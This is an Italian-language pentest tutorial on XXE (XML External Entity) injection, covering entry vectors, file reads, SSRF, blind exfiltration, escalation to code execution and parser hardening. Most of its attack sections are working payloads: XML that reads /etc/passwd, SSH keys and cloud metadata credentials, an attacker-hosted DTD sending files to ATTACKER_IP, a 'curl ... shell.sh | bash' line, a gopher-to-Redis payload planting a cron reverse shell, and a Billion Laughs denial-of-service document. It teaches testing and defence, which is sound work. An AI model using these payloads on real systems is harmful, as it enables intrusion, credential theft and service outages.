---
title: 'XXE Injection (XML External Entity): file read, SSRF e RCE'
slug: xxe
description: >-
  XXE (XML External Entity) nel pentest: payload per file read, SSRF, Blind XXE
  OOB e RCE, test con Burp Suite e Nuclei, prevenzione nei parser XML.
image: /xxe-xml-external-entity-hackita.webp
draft: false
date: 2026-08-16T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - XXE Injection
  - Blind XXE
  - OOB XXE
  - SSRF
  - Billion Laughs
---

# XXE (XML External Entity): Guida Completa da File Read a RCE

**XXE (XML External Entity Injection)** è una vulnerabilità dei parser XML. Un parser, in breve, è il programma che legge un file XML e lo trasforma in dati che l'applicazione può usare — apre il file, riconosce i tag, e se trova istruzioni particolari (come un `DOCTYPE`) le esegue. Il problema di XXE è che tra queste istruzioni ce n'è una che dice al parser "vai a leggere un file o un URL esterno e mettine il contenuto qui" — e il parser, per specifica, obbedisce senza controllare se quel comando arriva da una fonte fidata.

Se l'attaccante controlla anche solo in parte l'XML che il server processa, può far leggere al server un file locale (`/etc/passwd`, chiavi SSH, file di config) o fargli contattare un indirizzo a scelta (SSRF verso la rete interna, verso servizi cloud metadata). Quando la risposta non torna visibile (blind XXE), i dati si esfiltrano via OOB con un DTD esterno ospitato dall'attaccante. In alcuni contesti specifici (PHP con `expect`, filter chain, Redis raggiungibile via SSRF) XXE arriva fino a RCE. La causa è quasi sempre la stessa: il parser XML ha le **external entity abilitate di default**, ed è per questo che OWASP la classifica in **A05:2021 — Security Misconfiguration**.

XXE colpisce perché il punto di ingresso spesso non è ovvio. Non pensi subito a "dove c'è XML in questa app" — e infatti i posti più comuni sono nascosti: un upload di SVG, un endpoint SOAP dimenticato, un import di file Office. Un payload di 5 righe, in quei punti, può far uscire il contenuto di un file di sistema.

Fa parte del cluster [injection-attacks-guida-completa](https://hackita.it/articoli/injection-attacks-guida-completa). La variante specifica sull'injection XML è su [xxe-injection](https://hackita.it/articoli/xxe-injection). Le altre categorie di injection (SQL, comandi, LDAP, template engine) seguono la stessa logica di fondo: input non fidato che finisce dentro un interprete che si fida troppo.

***

## Come Funziona: Il Concetto Base

Per capire XXE serve prima capire le **entità XML** — è la parte che di solito viene saltata, e senza è impossibile capire perché il payload funziona.

Un'entità XML è, in pratica, una variabile: la definisci una volta nel `DOCTYPE`, e ovunque scrivi `&nome;` il parser la sostituisce con il suo valore. Le entità **interne** hanno un valore fisso scritto a mano, e sono innocue:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY nome "Mario">
]>
<utente><nome>&nome;</nome></utente>
<!-- Il parser sostituisce &nome; con "Mario" -->
```

Il problema nasce con le entità **esterne**: invece di un valore fisso, l'entità dichiara `SYSTEM` seguito da un percorso — un file locale o un URL. Il parser, per specifica XML, va a recuperare quella risorsa e la usa come valore dell'entità. Non è un bug isolato di un parser: è comportamento previsto dallo standard XML, e per questo è abilitato di default in moltissime librerie.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<utente><nome>&xxe;</nome></utente>
<!-- Il parser legge /etc/passwd e lo inserisce al posto di &xxe; -->
<!-- Se l'applicazione restituisce il valore di <nome> nella risposta -->
<!-- → l'attaccante legge il contenuto di /etc/passwd -->
```

Quindi il meccanismo dell'attacco è: (1) l'attaccante inserisce un `DOCTYPE` con un'entità `SYSTEM` nel documento XML che il server accetta, (2) il parser espande quell'entità recuperando la risorsa indicata, (3) se quel valore torna in qualche punto della risposta HTTP, l'attaccante lo legge. Il resto della guida è la variazione di questi tre passi in base a cosa succede al punto (3).

***

## Dove Cercare XXE: I Vettori di Ingresso

Prima regola pratica: XXE si cerca ovunque ci sia XML in transito, anche quando non è il formato "principale" dell'applicazione.

### Endpoint che Accettano XML Direttamente

Gli endpoint SOAP sono XML puro per definizione — sono il primo posto da controllare. Molte API REST moderne, però, accettano anche XML oltre a JSON senza dichiararlo apertamente: vale la pena provare a cambiare il `Content-Type` di una richiesta JSON normale e vedere se il server la processa comunque.

```bash
# Cerca request con Content-Type: text/xml o application/xml
# In Burp: filtra il Proxy History per "xml" nel Content-Type

# Endpoint SOAP (sempre XML)
POST /soap/endpoint HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "GetUser"
<soapenv:Envelope>...</soapenv:Envelope>

# API REST che accetta XML oltre a JSON
# Prova a cambiare Content-Type: application/json → text/xml
# e manda lo stesso body in formato XML
POST /api/users HTTP/1.1
Content-Type: text/xml
<?xml version="1.0"?><user><id>1</id></user>
```

### SVG Upload

Un SVG è, tecnicamente, un documento XML con la sintassi giusta per disegnare forme. Questo significa che ovunque un'app accetti upload di SVG (avatar, loghi, icone) e poi lo **processi lato server** — per convertirlo in PNG, per esempio — il parser SVG legge il `DOCTYPE` esattamente come farebbe con un XML qualunque.

```xml
<!-- Carica questo file come SVG (rinominalo profile.svg) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
<!-- Se l'app mostra il testo dell'SVG o lo converte in PNG
     con librerie come Batik, Inkscape o ImageMagick:
     il contenuto di /etc/passwd appare nel testo renderizzato -->
```

Se invece l'app serve l'SVG "com'è", senza passarlo per un parser server-side, questo vettore non c'è — vedi anche [file-upload-attack](https://hackita.it/articoli/file-upload-attack) per gli altri modi in cui un upload malevolo può colpire il backend.

### XML Import/Export (Docx, Excel, ODT)

I formati Office moderni (`.docx`, `.xlsx`, `.pptx`, `.odt`) non sono file binari monolitici: sono archivi ZIP che contengono, al loro interno, dei file XML separati (uno per il testo, uno per gli stili, e così via). Se l'applicazione **apre e riprocessa** questi file lato server — per esempio per estrarre testo o generare un'anteprima — quel parser interno legge anche il `DOCTYPE` che ci hai infilato dentro.

```bash
# Estrai un file docx
unzip documento.docx -d docx_content/

# Modifica word/document.xml aggiungendo il payload XXE
# prima del tag <w:document>:
cat >> docx_content/word/document.xml << 'EOF'
<!-- Aggiungi prima del contenuto esistente: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
EOF

# Ricompatta
cd docx_content && zip -r ../evil.docx .

# Carica evil.docx nell'applicazione → se parsano il XML interno → XXE
```

### RSS/Atom Feed Parser, Sitemap XML

Anche qui vale lo stesso principio: un feed RSS è XML, quindi se l'app importa feed da un URL che controlli, puoi servire un feed malevolo dal tuo server invece di scrivere il payload direttamente nella richiesta.

```bash
# Applicazioni che importano feed RSS da URL
# Manda un feed RSS malevolo dal tuo server
curl -X POST "https://target.com/import-feed" \
  -d "url=https://evil.com/malicious_feed.xml"

# malicious_feed.xml sul tuo server:
cat > malicious_feed.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
EOF
```

***

## Exploitation Step by Step

### Step 1 — Identifica il Parser e Testa con Payload Base

Non conviene partire subito con `file:///etc/passwd`: se il parser non è vulnerabile, o se l'output non torna in risposta, non lo sapresti mai. Meglio partire con un payload che fa una semplice richiesta HTTP verso un dominio che controlli (Burp Collaborator) — se il parser espande l'entità, quella richiesta arriva, a prescindere da cosa succede dopo nella risposta.

```xml
<!-- Payload probe OOB — non legge file, fa solo una richiesta HTTP -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ABC123.burpcollaborator.net/probe">
]>
<root>&xxe;</root>

<!-- Se Collaborator riceve la request HTTP → parser vulnerabile confermato -->
<!-- Se non arriva nulla → parser sicuro o firewall blocca outbound HTTP -->
<!-- In quel caso prova DNS (porta 53 quasi sempre aperta): -->
<!ENTITY xxe SYSTEM "http://ABC123.burpcollaborator.net">
<!-- Il DNS viene risolto anche se HTTP è bloccato -->
```

### Step 2 — Lettura File Locali (In-Band)

Se il payload probe funziona ed è **in-band** — cioè il valore dell'entità appare direttamente nella risposta HTTP — puoi passare diretto alla lettura di file veri, senza bisogno di server esterni.

```xml
<!-- Linux: file di ricognizione standard -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Risposta dell'applicazione: -->
<!-- root:x:0:0:root:/root:/bin/bash -->
<!-- daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin -->
<!-- ... -->

<!-- File ad alto valore su Linux: -->
file:///etc/passwd           → utenti del sistema
file:///etc/shadow           → hash password (solo se root)
file:///etc/hosts            → rete interna
file:///proc/net/tcp         → connessioni TCP attive (porta in hex)
file:///proc/self/environ    → variabili d'ambiente del processo (credenziali!)
file:///proc/self/cmdline    → comando con cui gira il processo
file:///home/USER/.ssh/id_rsa → chiave SSH privata
file:///var/www/html/config.php → credenziali DB
file:///var/www/html/.env    → variabili d'ambiente app

<!-- File ad alto valore su Windows: -->
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config   → credenziali ASP.NET
file:///C:/Users/Administrator/.ssh/id_rsa
file:///C:/xampp/htdocs/config.php
```

### Step 3 — Lettura File con PHP Wrapper (quando file:// non funziona)

A volte `file://` fa leggere il file, ma la risposta torna vuota o tronca: succede quando il file contiene caratteri che rompono la struttura XML (`<`, `>`, `&`, byte null) — il parser prova a interpretarli come markup e fallisce silenziosamente. Il wrapper `php://filter` risolve il problema: legge il file e lo **ricodifica in base64 prima di inserirlo nell'entità**, quindi dentro l'XML finiscono solo caratteri alfanumerici sicuri.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
    "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>

<!-- Risposta: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== -->
<!-- Decodifica: echo "cm9vdDp4OjA..." | base64 -d -->
<!-- → root:x:0:0:root:/root:/bin/bash -->

<!-- Utile anche per leggere codice sorgente PHP senza che venga eseguito -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

***

## XXE → SSRF: Accesso alla Rete Interna

Fin qui l'entità puntava sempre a un file locale. Se invece la punti a un URL, è il **server** a fare la richiesta HTTP per conto tuo — che è esattamente la definizione di [SSRF](https://hackita.it/articoli/ssrf). La differenza pratica: il server vittima ha accesso a indirizzi interni che tu, da fuori, non potresti mai raggiungere direttamente. Questo apre la strada a esplorare la rete dietro il firewall.

```xml
<!-- Accesso a servizi interni non esposti su internet -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<data>&xxe;</data>
<!-- Il server fa una GET verso 192.168.1.1/admin e ti restituisce la risposta -->

<!-- Port scanning interno tramite XXE -->
<!-- Prova porte diverse sullo stesso host — la differenza di timing rivela se sono aperte -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">   → app interna su 8080?
<!ENTITY xxe SYSTEM "http://127.0.0.1:8443/">   → HTTPS interno?
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">   → Elasticsearch?
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">   → Redis?
<!ENTITY xxe SYSTEM "http://127.0.0.1:27017/">  → MongoDB?

<!-- AWS metadata endpoint → credenziali IAM -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!-- Risposta: iam/, hostname, instance-id... -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- Risposta: nome del ruolo IAM -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/NOME_RUOLO">
<!-- Risposta: AccessKeyId, SecretAccessKey, Token → accesso AWS completo -->

<!-- GCP metadata -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">

<!-- Azure IMDS -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
```

Nota bene: gli endpoint metadata (`169.254.169.254`) sono un bersaglio ad alto valore perché restituiscono direttamente credenziali cloud temporanee — se l'app gira su AWS/GCP/Azure, questo passaggio da solo può valere un accesso completo all'account cloud, non solo al singolo server.

***

## Blind XXE: Quando la Risposta Non Ritorna

Nella maggior parte dei casi reali il parser processa il tuo XML, ma il valore dell'entità **non torna mai visibile** nella risposta HTTP — l'app magari risponde solo `{"status":"ok"}`. Questo si chiama blind XXE, ed è la situazione più comune in un pentest vero. Esistono due strade per estrarre dati comunque.

### Metodo 1 — OOB con DTD Esterno (Il Più Efficace)

L'idea: invece di mettere l'entità direttamente nell'XML che mandi al target, la fai dichiarare da un file DTD che **ospiti tu** su un server sotto il tuo controllo. Il target scarica quel DTD, esegue le istruzioni al suo interno (legge il file locale), e — sempre dentro il DTD — costruisce un'altra richiesta HTTP verso di te che include il contenuto del file come parametro. In pratica il file "esce" incapsulato in una URL.

Nota per chi non l'ha mai vista: l'`%` prima del nome (`<!ENTITY % file ...>`) è un'**entità parametrica** — si usa SOLO dentro un DTD (mai nel corpo del documento) e si richiama con `%file;` invece di `&file;`. Serve proprio per questi trucchi: ti permette di costruire "al volo", dentro il DTD, una seconda entità (`%eval;`) che a sua volta ne dichiara una terza (`%exfil;`) contenente l'URL con il file già incollato dentro. Ecco perché il DTD sotto ha tre righe che sembrano ripetersi: prima leggi il file (`%file`), poi assembli la richiesta con dentro il file (`%eval` costruisce `%exfil`), poi la lanci (`%exfil;`).

```bash
# Step 1: prepara il DTD malevolo sul tuo server
# File: evil.dtd
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%eval;
%exfil;
EOF

# Avvia un server HTTP per ricevere le richieste
python3 -m http.server 80

# Step 2: invia il payload XML al target
# Il payload carica il tuo DTD esterno
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">
  %dtd;
]>
<root>qualsiasi</root>
```

```bash
# Nel log del tuo server vedrai:
# GET /?data=root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash%0A... HTTP/1.1
# URL-decode → contenuto di /etc/passwd
python3 -c "import urllib.parse; print(urllib.parse.unquote('root%3Ax%3A...'))"
```

### Metodo 2 — Error-Based (Senza Server Esterno)

Se non hai modo di ricevere connessioni in uscita dal target (firewall restrittivo su tutte le porte, ambiente isolato) ma l'applicazione mostra i messaggi di errore del parser XML, puoi comunque estrarre dati: costruisci apposta un errore il cui messaggio contenga il file che vuoi leggere.

```xml
<!-- Causa un errore che include il contenuto del file nel messaggio -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>x</root>

<!-- Il parser cerca "file:///nonexistent/root:x:0:0:root:..." che non esiste
     e lancia un errore che include il path → il contenuto di /etc/passwd
     appare nel messaggio di errore della risposta -->
```

### Metodo 3 — DNS Exfiltration (File di Grandi Dimensioni)

Quando anche l'HTTP in uscita è bloccato ma il DNS no (è quasi sempre l'ultima porta aperta, perché senza risoluzione DNS il server non funzionerebbe), e il file da leggere è piccolo, puoi far uscire il suo contenuto dentro una query DNS.

```xml
<!-- Il contenuto del file viene inserito nel sottodominio DNS -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd "<!ENTITY &#x25; dns SYSTEM 'http://%file;.COLLABORATOR.net/'>">
  %dtd;
  %dns;
]>
<root>x</root>
<!-- DNS lookup: servername.COLLABORATOR.net → nome del server estratto via DNS -->
```

***

## XXE → RCE

In alcuni contesti specifici, XXE non si ferma alla lettura file o all'SSRF: arriva a esecuzione di codice diretta sul server.

### PHP expect:// Wrapper

Il wrapper `expect://` — quando l'estensione PHP `expect` è installata (raro in produzione, ma capita in ambienti di sviluppo o CTF) — esegue direttamente un comando di sistema invece di leggere un file.

```xml
<!-- Richiede l'estensione PHP "expect" (rara in produzione) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>
<!-- Se expect è abilitato: uid=33(www-data) -->
<!-- Da qui: expect://bash -c 'curl http://ATTACKER_IP/shell.sh | bash' -->
```

### XXE → PHP Filter Chain → RCE (CVE-2024-2961 / CosmicString)

Come descritto in [deserialization-attack](https://hackita.it/articoli/deserialization-attack), combinare XXE con una filter chain PHP porta a RCE su PHP. Il meccanismo: XXE legge un file tramite `php://filter`, e la catena di filtri costruisce un payload che finisce per essere eseguito sfruttando una vulnerabilità nella libreria `iconv`. Questa tecnica è stata usata concretamente contro Magento (CVE-2024-34102).

### XXE via SSRF → Redis → RCE

Se, tramite l'SSRF ottenuto con XXE, scopri un'istanza Redis interna senza autenticazione, puoi andare oltre la semplice lettura dati: il protocollo Gopher permette di inviare comandi Redis grezzi dentro l'URL dell'entità XXE. Il payload sotto, decodificato, dice a Redis: "svuota il database, poi scrivi una voce di crontab che ogni minuto lancia una reverse shell verso il mio host sulla porta 4444". Redis, non pensato per essere raggiungibile da input non fidato, esegue i comandi come se arrivassero da un client legittimo — e il cron di sistema, alla scadenza, esegue lo script scritto da Redis.

```xml
<!-- Gopher protocol: manda comandi Redis tramite XXE SSRF -->
<!ENTITY xxe SYSTEM
  "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A">
```

***

## Billion Laughs: XXE come DoS

Questa non è una tecnica per estrarre dati, ma per abbattere il servizio — vale la pena conoscerla perché usa lo stesso meccanismo delle entità, solo puntato in una direzione diversa. Ogni entità viene definita come 10 ripetizioni di quella al livello precedente: al nono livello, un solo `&lol9;` si espande a 10⁹ copie della stringa "lol", che il parser deve tenere tutte in memoria contemporaneamente prima di restituire il risultato.

```xml
<!-- ATTENZIONE: non testare in produzione — può abbattere il server -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
<!-- lol9 si espande a 10^9 entità "lol" = ~3GB di memoria -->
<!-- Il parser va in OOM → crash del servizio -->
```

***

## Come Rilevare XXE in un Pentest

### Manuale con Burp Suite

```bash
# Workflow in Burp:
# 1. Proxy History → filtra per Content-Type: *xml*
# 2. Per ogni request XML trovata → Send to Repeater
# 3. Aggiungi DOCTYPE con entità probe verso Burp Collaborator
# 4. Verifica callback in Collaborator → vulnerabile?
# 5. Se sì → scala a file read, poi SSRF

# Aggiungi DOCTYPE alla request esistente:
# PRIMA (request normale):
POST /api/import HTTP/1.1
Content-Type: application/xml
<data><user>mario</user></data>

# DOPO (con payload XXE probe):
POST /api/import HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR.net/probe">]>
<data><user>&xxe;</user></data>
```

### Automatico con Nuclei

```bash
# Nuclei ha template specifici per XXE
nuclei -u https://target.com -tags xxe -severity critical,high

# Con template specifico per SOAP
nuclei -u https://target.com/soap/endpoint \
  -t http/vulnerabilities/generic/xxe-detection.yaml
```

### Cerca Endpoint Nascosti

```bash
# Cerca endpoint XML non documentati
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -H "Content-Type: application/xml" \
  -mc 200,201,500

# Prova a cambiare Content-Type delle API JSON esistenti
# Da: Content-Type: application/json
# A:  Content-Type: application/xml (o text/xml)
# Alcune API accettano entrambi i formati
```

***

## Prevenzione

La difesa principale è una sola: disabilitare le external entity nel parser, così il `DOCTYPE` malevolo viene ignorato o rifiutato a prescindere da cosa contiene. Ogni linguaggio ha la sua configurazione specifica.

```java
// Java — DocumentBuilderFactory
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

// Java — SAXParserFactory
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

```python
# Python — lxml (sicuro di default dalla versione 3.x)
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)

# Python — defusedxml (libreria pensata per sicurezza)
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)  # blocca automaticamente XXE, Billion Laughs, ecc.
```

```php
// PHP — disabilita entità esterne
libxml_disable_entity_loader(true);  // PHP < 8.0
// PHP 8.0+: disabilitato di default

$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT);  // LIBXML_NOENT abilita entità → pericoloso
// Usa invece:
$dom->loadXML($xml);  // senza flag → più sicuro
```

***

## Checklist

```
DISCOVERY
☐ Burp History: richieste con Content-Type: *xml* trovate?
☐ Endpoint SOAP identificati (/soap, /ws, /service, /wsdl)?
☐ Upload di file: SVG, docx, xlsx, odt, XML puri accettati?
☐ Feed RSS/Atom importabili dall'applicazione?
☐ API JSON: accettano anche Content-Type: text/xml?
☐ nuclei -tags xxe eseguito

EXPLOITATION IN-BAND
☐ Payload probe OOB → callback Collaborator ricevuto?
☐ file:///etc/passwd → contenuto nella risposta?
☐ php://filter/base64-encode → output base64 in risposta?
☐ File ad alto valore letti: .env, config.php, wp-config.php, id_rsa?

BLIND XXE
☐ DTD esterno ostato sul server dell'attaccante
☐ Payload che carica DTD esterno inviato al target
☐ HTTP server dell'attaccante: richiesta con contenuto file ricevuta?
☐ DNS exfiltration testata (se HTTP bloccato)?
☐ Error-based: errore parser con contenuto file nel messaggio?

XXE → SSRF
☐ URL interni testati (127.0.0.1:PORTA, 192.168.x.x)?
☐ AWS metadata endpoint testato (169.254.169.254)?
☐ GCP/Azure metadata testati?
☐ Gopher verso Redis/Memcached testato?

ESCALATION
☐ PHP expect:// testato (RCE diretta)?
☐ SSRF → Redis → crontab scritto → RCE?

DOCUMENTAZIONE
☐ Screenshot payload inviato + risposta con file letto
☐ Screenshot callback OOB (per blind XXE)
☐ File ad alto valore estratti documentati
☐ Path di escalation (SSRF o RCE) documentato
```

***

## FAQ

**Qual è la differenza tra XXE in-band e blind?**
In-band: il valore dell'entità appare direttamente nella risposta HTTP — vedi subito il contenuto del file. Blind: il parser processa le entità ma il valore non torna nella risposta. In quel caso usi tecniche OOB (DTD esterno + server in ascolto) o error-based per estrarre i dati indirettamente.

**Il payload di probe non riceve callback. Il parser è sicuro?**
Non necessariamente. Potrebbe essere che il firewall blocchi le connessioni outbound HTTP — prova con DNS (porta 53). Potrebbe essere che il payload non venga inserito nel punto giusto della struttura XML. Potrebbe anche essere che il parser sia davvero protetto. Prova prima OOB, poi error-based, prima di concludere che non è vulnerabile.

**Perché php\://filter è utile per XXE?**
Il contenuto di alcuni file (come `/etc/passwd` o file binari) può contenere caratteri che rompono il parser XML quando vengono inseriti in un'entità — angled brackets, ampersand, caratteri null. `php://filter/convert.base64-encode` legge il file, lo codifica in base64 (solo caratteri alfanumerici + /+=), e lo inserisce nell'entità senza rompere il parsing.

**Un upload SVG è sempre vulnerabile a XXE?**
No. Dipende da come l'applicazione processa l'SVG: se lo serve direttamente come immagine senza parsarlo server-side, non c'è XXE. Se lo converte in PNG/JPEG usando Inkscape, Batik o librerie ImageMagick, il parser SVG legge il documento — e le external entity vengono processate.

**Qual è la severità in un report?**
File read di `/etc/passwd` o `/etc/hosts` → **High**. Lettura di credenziali DB o chiavi SSH → **Critical**. SSRF verso rete interna o metadata cloud → **High/Critical**. Blind XXE confermata ma senza dati estratti → **High**. Billion Laughs/DoS → **Medium**.

***

## Risorse

* [PortSwigger Web Security Academy — XXE](https://portswigger.net/web-security/xxe)
* [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
* [HackTricks — XXE](https://hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
* [defusedxml — libreria Python per XML sicuro](https://github.com/tiran/defusedxml)
